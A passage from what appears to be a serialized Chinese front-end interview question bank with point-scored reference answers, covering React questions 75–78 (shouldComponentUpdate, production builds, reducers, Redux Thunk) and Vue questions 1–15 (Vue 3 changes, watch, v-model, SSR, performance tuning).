shouldComponentUpdate有什么用？为什么它很重要？","text":"75. shouldComponentUpdate有什么用？为什么它很重要？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"组件状态数据或者属性数据发生更新的时候，组件会进入存在期，视图会渲染更新。在生命周期方法 should ComponentUpdate中，允许选择退出某些组件（和它们的子组件）的和解过程。","text":"组件状态数据或者属性数据发生更新的时候，组件会进入存在期，视图会渲染更新。在生命周期方法 should ComponentUpdate中，允许选择退出某些组件（和它们的子组件）的和解过程。","tokens":[{"type":"text","raw":"组件状态数据或者属性数据发生更新的时候，组件会进入存在期，视图会渲染更新。在生命周期方法 should ComponentUpdate中，允许选择退出某些组件（和它们的子组件）的和解过程。","text":"组件状态数据或者属性数据发生更新的时候，组件会进入存在期，视图会渲染更新。在生命周期方法 should ComponentUpdate中，允许选择退出某些组件（和它们的子组件）的和解过程。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"和解的最终目标是根据新的状态，以最有效的方式更新用户界面。如果我们知道用户界面的某一部分不会改变，那么没有理由让 React弄清楚它是否应该更新渲染。通过在 shouldComponentUpdate方法中返回 false, React将让当前组件及其所有子组件保持与当前组件状态相同。","text":"和解的最终目标是根据新的状态，以最有效的方式更新用户界面。如果我们知道用户界面的某一部分不会改变，那么没有理由让 React弄清楚它是否应该更新渲染。通过在 shouldComponentUpdate方法中返回 false, React将让当前组件及其所有子组件保持与当前组件状态相同。","tokens":[{"type":"text","raw":"和解的最终目标是根据新的状态，以最有效的方式更新用户界面。如果我们知道用户界面的某一部分不会改变，那么没有理由让 React弄清楚它是否应该更新渲染。通过在 shouldComponentUpdate方法中返回 false, React将让当前组件及其所有子组件保持与当前组件状态相同。","text":"和解的最终目标是根据新的状态，以最有效的方式更新用户界面。如果我们知道用户界面的某一部分不会改变，那么没有理由让 React弄清楚它是否应该更新渲染。通过在 shouldComponentUpdate方法中返回 false, React将让当前组件及其所有子组件保持与当前组件状态相同。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 76. 如何用 React构建（ build）生产模式？\\n\\n","depth":2,"text":"76. 如何用 React构建（ build）生产模式？","tokens":[{"type":"text","raw":"76. 如何用 React构建（ build）生产模式？","text":"76. 如何用 React构建（ build）生产模式？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"通常，使用 Webpack的 DefinePlugin方法将 NODE ENV设置为 production。这将剥离 propType验证和额外的警告。除此之外，还可以减少代码，因为 React使用 Uglify的dead-code来消除开发代码和注释，这将大大减少包占用的空间。","text":"通常，使用 Webpack的 DefinePlugin方法将 NODE ENV设置为 production。这将剥离 propType验证和额外的警告。除此之外，还可以减少代码，因为 React使用 Uglify的dead-code来消除开发代码和注释，这将大大减少包占用的空间。","tokens":[{"type":"text","raw":"通常，使用 Webpack的 DefinePlugin方法将 NODE ENV设置为 production。这将剥离 propType验证和额外的警告。除此之外，还可以减少代码，因为 React使用 Uglify的dead-code来消除开发代码和注释，这将大大减少包占用的空间。","text":"通常，使用 Webpack的 DefinePlugin方法将 NODE ENV设置为 production。这将剥离 propType验证和额外的警告。除此之外，还可以减少代码，因为 React使用 Uglify的dead-code来消除开发代码和注释，这将大大减少包占用的空间。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 77. 在 Reducer文件里，对于返回的结果，要注意哪些问题？\\n\\n","depth":2,"text":"77. 在 Reducer文件里，对于返回的结果，要注意哪些问题？","tokens":[{"type":"text","raw":"77. 在 Reducer文件里，对于返回的结果，要注意哪些问题？","text":"77. 在 Reducer文件里，对于返回的结果，要注意哪些问题？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"在 Reducer文件里，对于返回的结果，必须要使用 Object.assign ( )来复制一份新的 state，否则页面不会跟着数据刷新。","text":"在 Reducer文件里，对于返回的结果，必须要使用 Object.assign ( )来复制一份新的 state，否则页面不会跟着数据刷新。","tokens":[{"type":"text","raw":"在 Reducer文件里，对于返回的结果，必须要使用 Object.assign ( )来复制一份新的 state，否则页面不会跟着数据刷新。","text":"在 Reducer文件里，对于返回的结果，必须要使用 Object.assign ( )来复制一份新的 state，否则页面不会跟着数据刷新。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nreturn Object. assign ( { }， state, {\\ntype:action .type,\\nshouldNotPaint : true\\n})\\n\\n```","lang":"js","text":"\\nreturn Object. assign ( { }， state, {\\ntype:action .type,\\nshouldNotPaint : true\\n})\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 78. 什么是 Redux Thunk？它解决了什么问题？\\n\\n","depth":2,"text":"78. 什么是 Redux Thunk？它解决了什么问题？","tokens":[{"type":"text","raw":"78. 什么是 Redux Thunk？它解决了什么问题？","text":"78. 什么是 Redux Thunk？它解决了什么问题？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"Redux Thunk 是一个中间件，允许你在 action 创建函数中返回一个函数而不是一个 action 对象。这个返回的函数可以包含异步逻辑，并在适当的时候 dispatch 一个或多个 action。","text":"Redux Thunk 是一个中间件，允许你在 action 创建函数中返回一个函数而不是一个 action 对象。这个返回的函数可以包含异步逻辑，并在适当的时候 dispatch 一个或多个 action。","tokens":[{"type":"text","raw":"Redux Thunk 是一个中间件，允许你在 action 创建函数中返回一个函数而不是一个 action 对象。这个返回的函数可以包含异步逻辑，并在适当的时候 dispatch 一个或多个 action。","text":"Redux Thunk 是一个中间件，允许你在 action 创建函数中返回一个函数而不是一个 action 对象。这个返回的函数可以包含异步逻辑，并在适当的时候 dispatch 一个或多个 action。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"解决问题：","text":"解决问题：","tokens":[{"type":"text","raw":"解决问题：","text":"解决问题：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"异步操作：Redux Thunk 允许你处理异步操作，如 AJAX 请求，而不需要在 reducer 中处理异步逻辑。","text":"异步操作：Redux Thunk 允许你处理异步操作，如 AJAX 请求，而不需要在 reducer 中处理异步逻辑。","tokens":[{"type":"text","raw":"异步操作：Redux Thunk 允许你处理异步操作，如 AJAX 请求，而不需要在 reducer 中处理异步逻辑。","text":"异步操作：Redux Thunk 允许你处理异步操作，如 AJAX 请求，而不需要在 reducer 中处理异步逻辑。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"复杂逻辑：可以处理复杂的业务逻辑，如条件 dispatch、多次 dispatch 等。","text":"复杂逻辑：可以处理复杂的业务逻辑，如条件 dispatch、多次 dispatch 等。","tokens":[{"type":"text","raw":"复杂逻辑：可以处理复杂的业务逻辑，如条件 dispatch、多次 dispatch 等。","text":"复杂逻辑：可以处理复杂的业务逻辑，如条件 dispatch、多次 dispatch 等。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nimport { createStore, applyMiddleware } from \'redux\';\\nimport thunk from \'redux-thunk\';\\n\\nconst initialState = { data: null };\\n\\nconst reducer = (state = initialState, action) => {\\n  switch (action.type) {\\n    case \'FETCH_DATA_SUCCESS\':\\n      return { ...state, data: action.payload };\\n    default:\\n      return state;\\n  }\\n};\\n\\nconst fetchData = () => async (dispatch) => {\\n  const response = await fetch(\'/api/data\');\\n  const data = await response.json();\\n  dispatch({ type: \'FETCH_DATA_SUCCESS\', payload: data });\\n};\\n\\nconst store = createStore(reducer, applyMiddleware(thunk));\\n\\nstore.dispatch(fetchData());\\n\\n```","lang":"js","text":"\\nimport { createStore, applyMiddleware } from \'redux\';\\nimport thunk from \'redux-thunk\';\\n\\nconst initialState = { data: null };\\n\\nconst reducer = (state = initialState, action) => {\\n  switch (action.type) {\\n    case \'FETCH_DATA_SUCCESS\':\\n      return { ...state, data: action.payload };\\n    default:\\n      return state;\\n  }\\n};\\n\\nconst fetchData = () => async (dispatch) => {\\n  const response = await fetch(\'/api/data\');\\n  const data = await response.json();\\n  dispatch({ type: \'FETCH_DATA_SUCCESS\', payload: data });\\n};\\n\\nconst store = createStore(reducer, applyMiddleware(thunk));\\n\\nstore.dispatch(fetchData());\\n"}]},{"key":"Vue","content":"<h1>Vue</h1>\\n<h2>1. vue3和vue2的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（11 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 源码组织方式变化：使用 TS 重写</li>\\n<li><strong>1：</strong> 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）</li>\\n<li><strong>1：</strong> 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化</li>\\n<li><strong>1：</strong> 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容</li>\\n<li><strong>1：</strong> 打包体积优化：移除了一些不常用的api（inline-template、filter）</li>\\n<li><strong>1：</strong> 生命周期的变化：使用setup代替了之前的beforeCreate和created</li>\\n<li><strong>1：</strong> Vue3 的 template 模板支持多个根标签</li>\\n<li><strong>1：</strong> Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore</li>\\n<li><strong>1：</strong> Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例</li>\\n<li><strong>1：</strong> Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props</li>\\n<li><strong>1：</strong> 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下</li>\\n</ul>\\n<h2>2. watch 和 watchEffect 的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3分）</h4>\\n<ul>\\n<li><strong>1：</strong> watch ：既要指明监视的数据源，也要指明监视的回调。</li>\\n<li><strong>1：</strong> watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。</li>\\n<li><strong>1：</strong> watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。</li>\\n</ul>\\n<h2>3. 在 Vue2.x 中如何检测数组的变化？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><strong>1：</strong> 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。</li>\\n</ul>\\n<h2>4. 在 v-if 与 v-show 的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><strong>1：</strong> 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。</li>\\n</ul>\\n<h2>5. 如何实现 Vue 组件的插槽（slot）？有哪些类型的插槽？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><strong>1：</strong> 默认插槽、具名插槽、作用域插槽</li>\\n</ul>\\n<h2>6. 简述 Vuex 的核心概念和工作流程</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<ul>\\n<li><strong>1：</strong> 核心概念:<br/>\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, <br/>\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。<br>\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。<br/>\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)</li>\\n<li><strong>1：</strong> 工作流程：<br/>组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n和组件的更新。</li>\\n</ul>\\n<h2>7. Vue项目中如何进行性能优化？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（10分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 合理使用v-show和v-if：<br/>\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。<br/>\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。<br></li>\\n<li><strong>1：</strong> 优化组件的props和events传递：<br/>\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。<br/>\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。</li>\\n<li><strong>1：</strong> 使用keep-alive缓存组件:<br/>\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。<br/>\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。</li>\\n<li><strong>1：</strong> 列表渲染优化: 为v-for列表添加key属性<br/>\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。<br/>\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key</li>\\n<li><strong>2：</strong> 数据响应式优化: 避免过度的响应式数据<br/>\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。<br/>\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n对对象的第一层数据进行响应式处理，减少性能消耗。</li>\\n<li><strong>2：</strong> 路由层面优化: 路由懒加载<br/>\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n快首屏加载速度。<br/>\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () =&gt; import(&#39;./views/ProductDetail.vue&#39;)，在\\n路由配置中{ path: &#39;/product - detail&#39;, component: ProductDetail }。</li>\\n<li><strong>1：</strong> 代码压缩和混淆（Webpack 相关）<br/>\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。<br/></li>\\n<li><strong>1：</strong> 合理设置chunk大小和数量（Webpack 相关）<br/>\\n&emsp;原理：chunk是webpack在打包过程中生成的代码块。合理设置chunk的大小和数量可以更好地利用浏览器的缓存机制，减少重复请求，提高加载效率。如果chunk过\\n大，可能会导致加载时间过长；如果chunk过小，会产生过多的请求，增加请求开销。<br/>\\n&emsp;应用场景：根据应用的模块划分和功能需求来设置chunk。例如，可以将公共的库代码（如Vue、Vuex、Vue Router等）打包成一个单独的chunk，将不同业务模块\\n的代码分别打包成其他chunk。在webpack配置中，可以通过splitChunks配置项来控制chunk的生成，例如：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">module.exports = {\\n  optimization: {\\n    splitChunks: {\\n      chunks: &#39;all&#39;,\\n      minSize: 30000,\\n      maxSize: 0,\\n      minChunks: 1,\\n      maxAsyncRequests: 5,\\n      maxInitialRequests: 3,\\n      automaticNamePrefix: &#39;chunk - &#39;,\\n      cacheGroups: {\\n        vendors: {\\n          test: /[\\\\\\\\/]node_modules[\\\\\\\\/]/,\\n          priority: - 10\\n        },\\n        default: {\\n          minChunks: 2,\\n          priority: - 20,\\n          reuseExistingChunk: true\\n        }\\n      }\\n    }\\n  }\\n};\\n</code></pre>\\n</details>\\n\\n<h2>8. v-model 双向绑定的原理是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><strong>1：</strong> v-model本质就是一个语法糖，可以看成是value + input方法的语法糖。 可以通过model属性的prop和event属性来进行自定义。原生的v-model，会根据标签的不同生成不同的事件和属性 。</li>\\n</ul>\\n<h2>9. 在v-if 和 v-for 的优先级哪个高？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><strong>1：</strong> 在 vue2 中 v-for 的优先级更高，但是在 vue3 中优先级改变了。v-if 的优先级更高。</li>\\n</ul>\\n<h2>10. ref与reactive的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6分）</h4>\\n<ul>\\n<li><strong>1：</strong> ref与reactive 是 Vue3 新推出的主要 API 之一，它们主要用于响应式数据的创建。</li>\\n<li><strong>1：</strong> ref 函数创建的响应式数据，在模板中可以直接被使用，在 JS 中需要通过 .value 的形式才能使用。</li>\\n<li><strong>1：</strong> ref 函数可以接收原始数据类型与引用数据类型。</li>\\n<li><strong>1：</strong> reactive 函数只能接收引用数据类型。</li>\\n<li><strong>1：</strong> ref 底层还是使用 reactive 来做，ref 是在 reactive 上在进行了封装，增强了其能力，使它支持了对原始数据类型的处理。</li>\\n<li><strong>1：</strong> 在 Vue3 中 reactive 能做的，ref 也能做，reactive 不能做的，ref 也能做。</li>\\n</ul>\\n<h2>11. Vue 3 中的Teleport功能有什么作用，如何使用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<ul>\\n<li><strong>2：</strong> Teleport功能可以将组件的子树 “瞬移” 到 DOM 的其他位置，不受组件层级的限制。使用时，在组件中使用 <code>&lt;teleport&gt;</code> 标签包裹需要瞬移的元素，并\\n指定to属性为目标 DOM 元素的选择器或id。例如:</li>\\n</ul>\\n<pre><code class=\\"language-js\\">&lt;teleport to=&quot;#app-root&quot;&gt;...&lt;/teleport&gt;\\n//会将包裹的元素移动到id为app-root的元素内部。\\n</code></pre>\\n<h2>12. 如何在 Vue 3 中实现自定义指令的全局注册和局部注册？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><strong>1：</strong> 全局注册在 main.js 中使用 app.directive(&#39;指令名&#39;, 指令对象)；局部注册在组件内，通过 directives: { &#39;指令名&#39;: 指令对象 }，指令对象包含\\n mounted、updated 等生命周期钩子函数用于定义指令行为。</li>\\n</ul>\\n<h2>13. 说一下 Vue SSR 的实现原理</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>SSR也就是服务端渲染，也就是将Vue在客户端把标签渲染成HTML的工作放在服务端完成，然后再把html直接返回给客户端。</p>\\n</li>\\n<li><p>SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。</p>\\n</li>\\n</ul>\\n<h2>14. Vue 组件的 data 为什么必须是函数？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li>一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。</li>\\n</ul>\\n<h2>15. vue 中的 spa 应用如何优化首屏加载速度?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p>请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。</p>\\n</li>\\n<li><p>缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验</p>\\n</li>\\n<li><p>gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。</p>\\n</li>\\n<li><p>http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。</p>\\n</li>\\n<li><p>懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件</p>\\n</li>\\n<li><p>预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化</p>\\n</li>\\n<li><p>合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积</p>\\n</li>\\n<li><p>使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化</p>\\n</li>\\n<li><p>提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程</p>\\n</li>\\n<li><p>封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 